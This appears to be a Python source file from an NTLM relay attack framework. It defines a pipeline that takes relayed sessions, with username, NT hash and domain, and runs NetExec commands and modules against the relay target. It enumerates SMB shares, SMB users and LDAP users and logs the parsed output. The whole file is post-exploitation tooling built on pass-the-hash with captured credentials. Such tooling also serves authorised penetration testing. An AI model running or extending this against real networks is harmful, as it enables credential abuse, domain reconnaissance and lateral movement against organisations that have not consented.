"""Post-auth action pipeline using nxc Docker containers."""
from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List

from btc_relay_module_nxc_impckt.config import AppConfig, ProtocolActions
from btc_relay_module_nxc_impckt.controller.nxc_ctrl import NxcController
from btc_relay_module_nxc_impckt.logger import get_logger, jsonl_event
from btc_relay_module_nxc_impckt.parser.nxc_output import parse_generic, parse_ldap_users, parse_smb_shares, parse_smb_users
from btc_relay_module_nxc_impckt.session import RelaySession, SessionRegistry, SessionStatus

logger = get_logger()


class PostAuthPipeline:
    def __init__(self, cfg: AppConfig, registry: SessionRegistry) -> None:
        self.cfg = cfg
        self.registry = registry
        self.nxc = NxcController(cfg)

    def run_for_session(self, session: RelaySession) -> None:
        """Execute all configured post-auth checks for a single relayed session."""
        if not self.cfg.post_auth.enabled:
            return

        self.registry.transition(session.id, SessionStatus.POST_AUTH)
        tasks = self._build_task_list(session)
        logger.info(f"[PostAuth] {session.id} running {len(tasks)} checks")

        with ThreadPoolExecutor(max_workers=self.cfg.post_auth.workers) as executor:
            futures = {}
            for task in tasks:
                future = executor.submit(self._execute_check, session, task)
                futures[future] = task

            for future in as_completed(futures):
                task = futures[future]
                try:
                    result = future.result()
                    session.post_auth_results.append(result)
                    jsonl_event("post_auth_result", session_id=session.id, task=task, result=result)
                except Exception:
                    logger.exception(f"Post-auth exception for {session.id}")

        self.registry.transition(session.id, SessionStatus.COMPLETED)
        jsonl_event("session_completed", session=session.to_dict())

    def _build_task_list(self, session: RelaySession) -> List[Dict[str, Any]]:
        tasks: List[Dict[str, Any]] = []
        target = session.relay_target or ""
        for proto_name, proto_cfg in self.cfg.post_auth.protocols.items():
            if not proto_cfg.enabled:
                continue
            for cmd in proto_cfg.commands:
                tasks.append({
                    "protocol": proto_name,
                    "target": target,
                    "type": "command",
                    "arg": cmd,
                })
            for mod in proto_cfg.modules:
                tasks.append({
                    "protocol": proto_name,
                    "target": target,
                    "type": "module",
                    "arg": mod,
                })
        return tasks

    def _execute_check(self, session: RelaySession, task: Dict[str, Any]) -> Dict[str, Any]:
        protocol = task["protocol"]
        target = task["target"]
        check_type = task["type"]
        arg = task["arg"]

        extra_args: List[str] = []
        if check_type == "command":
            extra_args.append(arg)
        elif check_type == "module":
            extra_args += ["-M", arg]

        success, stdout = self.nxc.post_auth(
            protocol=protocol,
            target=target,
            username=session.username,
            nthash=session.nthash or "",
            domain=session.domain,
            extra_args=extra_args,
        )

        # Parse output
        parsed = self._parse(protocol, arg, stdout)
        return {
            "protocol": protocol,
            "check_type": check_type,
            "arg": arg,
            "target": target,
            "success": success,
            "parsed": parsed,
            "raw_stdout": stdout[:2000],
        }

    def _parse(self, protocol: str, arg: str, stdout: str) -> Any:
        if protocol == "smb" and "shares" in arg:
            return parse_smb_shares(stdout)
        if protocol == "smb" and "users" in arg:
            return parse_smb_users(stdout)
        if protocol == "ldap" and "users" in arg:
            return parse_ldap_users(stdout)
        return parse_generic(stdout, protocol)
